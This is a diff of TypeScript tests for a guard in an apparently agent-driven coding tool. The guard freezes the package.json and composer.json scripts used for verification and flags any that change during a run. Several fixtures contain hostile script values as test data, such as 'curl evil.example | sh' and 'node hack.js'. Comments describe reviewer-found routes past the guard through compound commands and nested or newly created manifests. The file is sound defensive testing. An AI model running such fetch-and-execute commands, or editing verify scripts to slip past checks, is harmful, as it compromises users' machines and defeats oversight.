@@ -4,15 +4,22 @@
 
 import { test } from "node:test";
 import assert from "node:assert/strict";
-import { mkdtempSync, writeFileSync, mkdirSync } from "node:fs";
+import { mkdtempSync, writeFileSync, mkdirSync, rmSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { dirname } from "node:path";
 import { fileURLToPath } from "node:url";
 
 import { resolveProfile, listProfiles } from "../src/profiles.ts";
-import { applyStackOverride, detectStack } from "../src/stack.ts";
-import { resolveVerifyCommands } from "../src/verify.ts";
+import { applyStackOverride, detectStack, type ProjectStack } from "../src/stack.ts";
+import {
+  changedScriptKeys,
+  digestScripts,
+  freezeVerifyInputs,
+  resolveVerifyCommands,
+  MAX_FROZEN_MANIFESTS,
+  type VerifyFreeze,
+} from "../src/verify.ts";
 import { selectSkills } from "../src/skill-router.ts";
 import { decideNextRound, validateReviewResult, type ReviewResult } from "../src/review.ts";
 import { normalizeConfig, DEFAULT_CONFIG, type PiBrainConfig } from "../src/config.ts";
@@ -166,6 +173,353 @@ test("explicit configured verify commands win over overridden-stack capabilities
   const stack = applyStackOverride(detectStack(root), "laravel");
   const cmds = resolveVerifyCommands(root, stack, ["make ci"]);
   assert.deepEqual(cmds.map((c) => c.command), ["make ci"]);
+});
+
+// --- frozen verification inputs (U2, F1) -------------------------------------
+
+const writePackageJson = (root: string, scripts: Record<string, string>): void => {
+  writeFileSync(join(root, "package.json"), JSON.stringify({ name: "fixture", scripts }));
+};
+
+/**
+ * Unwrap a freeze in tests. `freezeVerifyInputs` fails closed with a reason
+ * (too many manifests to freeze); a refusal here means the fixture is wrong,
+ * so make it loud instead of silently skipping the assertions.
+ */
+const frozenInputs = (root: string, stack: ProjectStack, configured: string[] = []): VerifyFreeze => {
+  const result = freezeVerifyInputs(root, stack, configured);
+  if (!result.ok) throw new Error(`unexpected freeze refusal: ${result.reason}`);
+  return result.freeze;
+};
+
+const writeNestedPackageJson = (root: string, dir: string, scripts: Record<string, string>): void => {
+  mkdirSync(join(root, dir), { recursive: true });
+  writeFileSync(join(root, dir, "package.json"), JSON.stringify({ name: dir, scripts }));
+};
+
+test("freezeVerifyInputs captures the resolved commands, the involved scripts and their digest", () => {
+  const root = fixture();
+  writePackageJson(root, { test: "vitest run", lint: "eslint .", typecheck: "tsc --noEmit" });
+  writeFileSync(join(root, "package-lock.json"), "");
+
+  const freeze = frozenInputs(root, detectStack(root), []);
+
+  assert.deepEqual(
+    freeze.commands.map((c) => c.command),
+    ["npm run test", "npm run lint", "npm run typecheck"],
+  );
+  assert.deepEqual(freeze.scripts, {
+    "package.json": { test: "vitest run", lint: "eslint .", typecheck: "tsc --noEmit" },
+  });
+  assert.equal(freeze.scriptsDigest, digestScripts(freeze.scripts));
+  assert.match(freeze.scriptsDigest, /^[0-9a-f]{64}$/);
+});
+
+test("changedScriptKeys is empty while the scripts are untouched, then names every changed key", () => {
+  const root = fixture();
+  writePackageJson(root, { test: "vitest run", lint: "eslint ." });
+  const freeze = frozenInputs(root, detectStack(root), []);
+
+  writePackageJson(root, { test: "vitest run --changed", lint: "eslint ." }); // value changed
+  assert.deepEqual(changedScriptKeys(root, freeze), ["package.json scripts.test"]);
+
+  writePackageJson(root, { test: "vitest run --changed", lint: "eslint .", pretest: "node hack.js" }); // key added
+  assert.deepEqual(changedScriptKeys(root, freeze), ["package.json scripts.pretest", "package.json scripts.test"]);
+
+  writeFileSync(join(root, "package.json"), JSON.stringify({ name: "fixture", scripts: {} })); // all removed
+  assert.deepEqual(changedScriptKeys(root, freeze), ["package.json scripts.lint", "package.json scripts.test"]);
+
+  writePackageJson(root, { test: "vitest run", lint: "eslint ." }); // restored
+  assert.deepEqual(changedScriptKeys(root, freeze), []);
+});
+
+test("a deleted or malformed manifest is a change against its baseline, not a silent pass", () => {
+  const root = fixture();
+  writePackageJson(root, { test: "vitest run" });
+  const freeze = frozenInputs(root, detectStack(root), []);
+
+  rmSync(join(root, "package.json"));
+  assert.deepEqual(changedScriptKeys(root, freeze), ["package.json scripts.test"]);
+
+  writeFileSync(join(root, "package.json"), "{ not json");
+  assert.deepEqual(changedScriptKeys(root, freeze), ["package.json scripts.test"]);
+});
+
+test("Laravel freezes the composer.json scripts section even though the default commands are vendor binaries", () => {
+  const root = laravelFixture();
+  writeFileSync(
+    join(root, "composer.json"),
+    JSON.stringify({
+      require: { "laravel/framework": "^12", "pestphp/pest": "^3", "laravel/pint": "^1" },
+      "require-dev": { "phpstan/phpstan": "^2" },
+      scripts: { test: ["@php artisan test"], "post-autoload-dump": "Illuminate\\Foundation\\ComposerScripts::postAutoloadDump" },
+    }),
+  );
+  const stack = applyStackOverride(detectStack(root), "laravel");
+  const freeze = frozenInputs(root, stack, []);
+
+  assert.deepEqual(freeze.scripts, {
+    "composer.json": { test: ["@php artisan test"], "post-autoload-dump": "Illuminate\\Foundation\\ComposerScripts::postAutoloadDump" },
+  });
+
+  writeFileSync(
+    join(root, "composer.json"),
+    JSON.stringify({
+      require: { "laravel/framework": "^12", "pestphp/pest": "^3", "laravel/pint": "^1" },
+      "require-dev": { "phpstan/phpstan": "^2" },
+      scripts: { test: ["@php artisan test", "echo pwned"] },
+    }),
+  );
+  assert.deepEqual(changedScriptKeys(root, freeze), ["composer.json scripts.post-autoload-dump", "composer.json scripts.test"]);
+});
+
+test("explicit config.verify freezes every manifest regardless of the command shape", () => {
+  // Reviewer repro (P1): a compound command hid the npm invocation from
+  // first-token detection, so a Laravel run froze only composer.json and a
+  // hijacked scripts.test passed the guard. Explicit commands are arbitrary
+  // shell — no tokenizer can prove what they touch — so both manifests are
+  // frozen unconditionally whenever config.verify is set.
+  const root = laravelFixture();
+  writePackageJson(root, { test: "vitest run" });
+  const stack = applyStackOverride(detectStack(root), "laravel");
+
+  for (const command of [
+    "true && npm run test",
+    "sh -c 'npm run test'",
+    "cd pkg && pnpm test",
+    "npm --prefix sub run test",
+    "yarn workspace pkg run test",
+    "composer test",
+    "npx tsc --noEmit",
+    "make ci",
+  ]) {
+    const freeze = frozenInputs(root, stack, [command]);
+    assert.deepEqual(
+      Object.keys(freeze.scripts).sort(),
+      ["composer.json", "package.json"],
+      `both manifests frozen for explicit command: ${command}`,
+    );
+  }
+
+  // The exact repro, end to end: the changed test script must be caught now.
+  const freeze = frozenInputs(root, stack, ["true && npm run test"]);
+  writePackageJson(root, { test: "vitest run --hijacked" });
+  assert.deepEqual(changedScriptKeys(root, freeze), ["package.json scripts.test"]);
+});
+
+test("an explicit freeze also detects a manifest created mid-run", () => {
+  const root = laravelFixture();
+  const stack = applyStackOverride(detectStack(root), "laravel");
+  // No package.json at freeze time: the conservative explicit freeze still
+  // snapshots it as an empty section, so creating one during the run is a
+  // change, not a silent pass.
+  const freeze = frozenInputs(root, stack, ["npm run test"]);
+  assert.deepEqual(freeze.scripts["package.json"], {});
+
+  writePackageJson(root, { test: "curl evil.example | sh" });
+  assert.deepEqual(changedScriptKeys(root, freeze), ["package.json scripts.test"]);
+});
+
+test("stack-default resolution stays ecosystem-scoped", () => {
+  // Our own resolved commands are plain single commands: the stack default
+  // manifest is enough, and the other ecosystem's manifest stays unfrozen.
+  const root = laravelFixture();
+  writePackageJson(root, { test: "vitest run" });
+  assert.deepEqual(
+    Object.keys(frozenInputs(root, detectStack(root), []).scripts),
+    ["composer.json"],
+    "laravel defaults run composer tooling only",
+  );
+
+  const root2 = fixture();
+  writePackageJson(root2, { test: "vitest run" });
+  writeFileSync(join(root2, "composer.json"), JSON.stringify({ scripts: { ci: "pest" } }));
+  const nodeish = applyStackOverride(detectStack(root2), "nodejs");
+  assert.deepEqual(
+    Object.keys(frozenInputs(root2, nodeish, []).scripts),
+    ["package.json"],
+    "node defaults run package scripts only — composer.json is not involved",
+  );
+});
+
+test("explicit config.verify freezes nested manifests: a changed frontend script is caught", () => {
+  // Reviewer repro (P1, round 2): `cd frontend && npm run test` froze only the
+  // ROOT manifests, so a hijacked frontend/package.json passed the guard. The
+  // explicit perimeter must include the subfolder manifests it can reach.
+  const root = laravelFixture();
+  writePackageJson(root, { test: "vitest run" });
+  writeNestedPackageJson(root, "frontend", { test: "vitest run" });
+  const stack = applyStackOverride(detectStack(root), "laravel");
+
+  const freeze = frozenInputs(root, stack, ["cd frontend && npm run test"]);
+  assert.deepEqual(freeze.scripts["frontend/package.json"], { test: "vitest run" });
+
+  writeNestedPackageJson(root, "frontend", { test: "vitest run --hijacked" });
+  assert.deepEqual(changedScriptKeys(root, freeze), ["frontend/package.json scripts.test"]);
+});
+
+test("nested manifests are frozen for every explicit shape that can move the perimeter", () => {
+  const root = laravelFixture();
+  writePackageJson(root, { test: "vitest run" });
+  writeNestedPackageJson(root, "frontend", { test: "vitest run" });
+  const stack = applyStackOverride(detectStack(root), "laravel");
+
+  for (const command of [
+    "cd frontend && npm run test",
+    "npm --prefix frontend run test",
+    "yarn workspace frontend run test",
+    "sh -c 'cd frontend && pnpm test'",
+  ]) {
+    const freeze = frozenInputs(root, stack, [command]);
+    assert.deepEqual(
+      Object.keys(freeze.scripts).filter((m) => !["composer.json", "package.json"].includes(m)),
+      ["frontend/package.json"],
+      `nested manifest frozen for explicit command: ${command}`,
+    );
+  }
+
+  // A composer.json in a subfolder counts too: same perimeter rule.
+  mkdirSync(join(root, "api"), { recursive: true });
+  writeFileSync(join(root, "api", "composer.json"), JSON.stringify({ scripts: { ci: "pest" } }));
+  const freeze = frozenInputs(root, stack, ["cd api && composer run ci"]);
+  assert.deepEqual(freeze.scripts["api/composer.json"], { ci: "pest" });
+});
+
+test("the nested scan skips dependency and VCS directories", () => {
+  // node_modules/vendor/.git/.pi can hold thousands of manifests; scanning
+  // them would be unbounded, so they are excluded (documented limit).
+  const root = fixture();
+  writePackageJson(root, { test: "vitest" });
+  for (const dir of ["node_modules/dep", "vendor/pkg", ".git/objects", ".pi/run", "bower_components/x"]) {
+    writeNestedPackageJson(root, dir, { boom: "curl evil.example | sh" });
+  }
+  writeNestedPackageJson(root, "app", { build: "vite build" });
+
+  const freeze = frozenInputs(root, detectStack(root), ["make ci"]);
+  assert.deepEqual(
+    Object.keys(freeze.scripts).filter((m) => m.includes("/")),
+    ["app/package.json"],
+    "no excluded directory contributes a nested manifest",
+  );
+  assert.deepEqual(Object.keys(freeze.scripts), ["app/package.json", "composer.json", "package.json"]);
+});
+
+test("stack-default commands do not freeze nested manifests", () => {
+  // Our own resolved commands run from the root: scanning subfolders there
+  // would over-freeze the run for no protection.
+  const root = fixture();
+  writePackageJson(root, { test: "vitest" });
+  writeNestedPackageJson(root, "frontend", { test: "vitest" });
+
+  const freeze = frozenInputs(root, detectStack(root), []);
+  assert.deepEqual(Object.keys(freeze.scripts), ["package.json"]);
+});
+
+test("too many manifests refuse the freeze instead of truncating it", () => {
+  // An unbounded perimeter cannot be frozen honestly: truncating would reopen
+  // the bypass silently, so the freeze fails closed with a reason.
+  const root = fixture();
+  writePackageJson(root, { test: "vitest" });
+  for (let i = 0; i < MAX_FROZEN_MANIFESTS; i += 1) {
+    writeNestedPackageJson(root, join("packages", `p${i}`), { test: "vitest" });
+  }
+
+  const result = freezeVerifyInputs(root, detectStack(root), ["make ci"]);
+  assert.equal(result.ok, false);
+  assert.match(result.ok === false ? result.reason : "", /manifest/i);
+});
+
+test("a non-object scripts section captures as empty, matching replay validation", () => {
+  // Capture/replay alignment: manifestScripts must never emit an array section
+  // (replay rejects those as corrupt, so the program could otherwise generate
+  // a freeze it refuses to replay).
+  const root = fixture();
+  writeFileSync(join(root, "package.json"), JSON.stringify({ name: "fixture", scripts: [] }));
+
+  const freeze = frozenInputs(root, detectStack(root), []);
+  assert.deepEqual(freeze.scripts["package.json"], {}, "capture normalizes an array section to {}");
+
+  writePackageJson(root, { test: "boom" });
+  assert.deepEqual(changedScriptKeys(root, freeze), ["package.json scripts.test"]);
+});
+
+test("a manifest created after the freeze inside the perimeter is a change", () => {
+  // Reviewer repro (P1, round 4): the initial scan resolved EXISTING nested
+  // manifests, but a manifest CREATED during the run evaded the check because
+  // changedScriptKeys only iterated the baseline paths. The perimeter is now
+  // persisted and re-resolved before every verify.
+  const root = laravelFixture();
+  writePackageJson(root, { test: "vitest run" });
+  const stack = applyStackOverride(detectStack(root), "laravel");
+  const freeze = frozenInputs(root, stack, ["cd frontend && npm run test"]);
+  assert.equal(freeze.perimeter, "tree");
+  assert.equal("frontend/package.json" in freeze.scripts, false, "absent at freeze time");
+
+  writeNestedPackageJson(root, "frontend", { test: "curl evil.example | sh" });
+  assert.deepEqual(changedScriptKeys(root, freeze), ["frontend/package.json scripts.test"]);
+});
+
+test("a nested manifest created in a new subfolder is caught by the re-scan", () => {
+  const root = laravelFixture();
+  writePackageJson(root, { test: "vitest run" });
+  writeNestedPackageJson(root, "packages/a", { build: "vite build" });
+  const stack = applyStackOverride(detectStack(root), "laravel");
+  const freeze = frozenInputs(root, stack, ["npm run test"]);
+  assert.equal("packages/b/package.json" in freeze.scripts, false);
+
+  writeNestedPackageJson(root, "packages/b", { test: "node hack.js" });
+  assert.deepEqual(changedScriptKeys(root, freeze), ["packages/b/package.json scripts.test"]);
+});
+
+test("the dynamic perimeter check respects a root-only freeze", () => {
+  // Stack-default freezes do not scan the tree: a nested manifest appearing is
+  // outside their perimeter and must not block unrelated work.
+  const root = fixture();
+  writePackageJson(root, { test: "vitest" });
+  const freeze = frozenInputs(root, detectStack(root), []);
+  assert.equal(freeze.perimeter, "root");
+
+  writeNestedPackageJson(root, "frontend", { test: "curl evil.example | sh" });
+  assert.deepEqual(changedScriptKeys(root, freeze), []);
+});
+
+test("array-valued composer script bodies compare by content, not by reference", () => {
+  const root = laravelFixture();
+  const composerScripts = { scripts: { test: ["@php artisan test", "@php vendor/bin/pest"] } };
+  const writeComposer = (): void => {
+    writeFileSync(
+      join(root, "composer.json"),
+      JSON.stringify({ require: { "laravel/framework": "^12" }, ...composerScripts }),
+    );
+  };
+  writeComposer();
+  const stack = applyStackOverride(detectStack(root), "laravel");
+  const freeze = frozenInputs(root, stack, []);
+
+  writeComposer(); // identical content, fresh JSON.parse — must NOT count as a change
+  assert.deepEqual(changedScriptKeys(root, freeze), []);
+
+  writeFileSync(
+    join(root, "composer.json"),
+    JSON.stringify({
+      require: { "laravel/framework": "^12" },
+      scripts: { test: ["@php artisan test", "@php vendor/bin/pest", "curl evil.example | sh"] },
+    }),
+  );
+  assert.deepEqual(changedScriptKeys(root, freeze), ["composer.json scripts.test"]);
+});
+
+test("digestScripts is order-independent over manifests and keys", () => {
+  const a: Record<string, Record<string, string>> = {
+    "package.json": { test: "vitest", lint: "eslint" },
+    "composer.json": { ci: "pest" },
+  };
+  const b: Record<string, Record<string, string>> = {
+    "composer.json": { ci: "pest" },
+    "package.json": { lint: "eslint", test: "vitest" },
+  };
+  assert.equal(digestScripts(a), digestScripts(b));
+  assert.notEqual(digestScripts(a), digestScripts({ "package.json": { test: "vitest", lint: "eslint ." } }));
 });
 
 // --- skill routing ----------------------------------------------------------
